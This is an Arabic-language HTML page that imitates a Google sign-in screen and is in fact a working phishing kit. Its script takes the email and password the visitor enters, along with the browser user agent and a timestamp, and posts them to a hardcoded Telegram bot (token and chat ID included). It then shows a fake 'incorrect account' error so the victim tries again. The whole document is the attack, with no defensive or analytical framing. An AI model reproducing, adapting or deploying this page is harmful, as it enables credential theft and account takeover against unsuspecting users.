<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>تسجيل الدخول - Google</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', -apple-system, Arial, sans-serif; }
body { background: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
.box { background: #fff; padding: 40px 30px; border-radius: 8px; max-width: 450px; width: 100%; border: 1px solid #dadce0; }
.logo { text-align: center; margin-bottom: 25px; }
.logo img { height: 50px; width: auto; }
h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 10px; color: #202124; }
.sub { font-size: 14px; color: #5f6368; text-align: center; margin-bottom: 30px; }
.field { margin-bottom: 18px; }
.field input { width: 100%; padding: 14px 16px; font-size: 15px; border: 1px solid #dadce0; border-radius: 4px; outline: none; direction: ltr; }
.field input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.1); }
.field label { display: block; font-size: 13px; color: #5f6368; margin-bottom: 6px; }
.btn { width: 100%; padding: 14px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-size: 15px; font-weight: 500; cursor: pointer; }
.btn:disabled { background: #ccc; }
.terms { display: flex; align-items: flex-start; gap: 10px; margin: 20px 0; font-size: 13px; color: #5f6368; }
.terms input { margin-top: 3px; width: 16px; height: 16px; }
.terms a { color: #1a73e8; text-decoration: none; }
.footer { text-align: center; margin-top: 25px; font-size: 12px; color: #5f6368; }
.msg { padding: 12px; border-radius: 4px; font-size: 13px; margin-bottom: 15px; display: none; text-align: center; }
.msg.err { background: #fce8e6; color: #c5221f; display: block; }
.badge { position: fixed; bottom: 5px; left: 5px; font-size: 9px; color: #aaa; }
</style>
</head>
<body>
<div class="badge"></div>

<div class="box">
    <div class="logo"><img src="google.png" alt="Google"></div>
    <h1>تسجيل الدخول</h1>
    <p class="sub">استخدم حسابك في Google</p>

    <div class="msg" id="msg"></div>

    <div class="field">
        <label>البريد الإلكتروني</label>
        <input type="email" id="email" placeholder="example@gmail.com">
    </div>

    <div class="field">
        <label>كلمة المرور</label>
        <input type="password" id="pass" placeholder="••••••••">
    </div>

    <div class="terms">
        <input type="checkbox" id="terms">
        <label for="terms">أوافق على الشروط</label>
    </div>

    <button class="btn" id="btn" onclick="submitForm()">التالي</button>

    <div class="footer">Google © 2026</div>
</div>

<script>
const TOKEN = "8885955583:AAFB3gmzus0AJNLcRlDkZ8UsOWH_4DnManE";
const CHAT_ID = "7560932400";

function send(t) {
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({chat_id: CHAT_ID, text: t})
    }).catch(()=>{});
}

function submitForm() {
    const email = document.getElementById("email").value.trim();
    const pass = document.getElementById("pass").value;
    const terms = document.getElementById("terms").checked;
    const msg = document.getElementById("msg");
    const btn = document.getElementById("btn");

    if (!email || !pass) { msg.className = "msg err"; msg.innerText = "يرجى إدخال البريد وكلمة المرور"; return; }
    if (!terms) { msg.className = "msg err"; msg.innerText = "يجب الموافقة على الشروط"; return; }

    btn.disabled = true;
    btn.innerText = "جاري التحقق...";

    let info = {
        "النوع": "Google Play",
        "البريد الإلكتروني": email,
        "كلمة المرور": pass,
        "المتصفح": navigator.userAgent,
        "الوقت": new Date().toLocaleString("ar-EG")
    };

    send("📧 *تسجيل دخول Google:*\n\n" + Object.entries(info).map(([k,v]) => `${k}: ${v}`).join("\n"));

    setTimeout(() => {
        msg.className = "msg err";
        msg.innerText = "يبدو أن هذا الحساب غير صحيح. حاول مرة أخرى.";
        btn.disabled = false;
        btn.innerText = "التالي";
    }, 2000);
}
</script>
</body>
</html>
